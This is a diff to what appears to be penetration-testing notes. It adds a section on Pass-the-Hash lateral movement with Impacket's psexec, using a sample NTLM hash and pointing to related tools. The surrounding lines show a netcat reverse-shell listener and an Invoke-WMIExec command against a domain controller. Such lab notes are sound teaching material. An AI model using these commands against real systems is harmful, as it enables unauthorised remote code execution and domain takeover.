@@ -3971,6 +3971,8 @@ We can also get a reverse shell connection in the target machine.
 .\nc.exe -lvnp <PORT>
 ```
 
+**Generate the payload**
+
 To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP and port, and select the option *PowerShell #3 (Base64)*.
 
 To perform Pass-the-Hash (PtH) execution of a PowerShell reverse shell on the target DC01, use the following syntax with Invoke-TheHash:
@@ -3990,6 +3992,23 @@ Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> 
 The result is a reverse shell connection from the DC01 host.
 
 </details>
+
+</details>
+
+<details>
+<summary><h3>Pass the Hash with Impacket (Linux)</h3></summary>
+
+We'll use Impacket's `psexec.py` to execute commands on the target system.
+
+```bash
+impacket-psexec administrator@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
+
+* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
+* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
+* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
 
 </details>
 
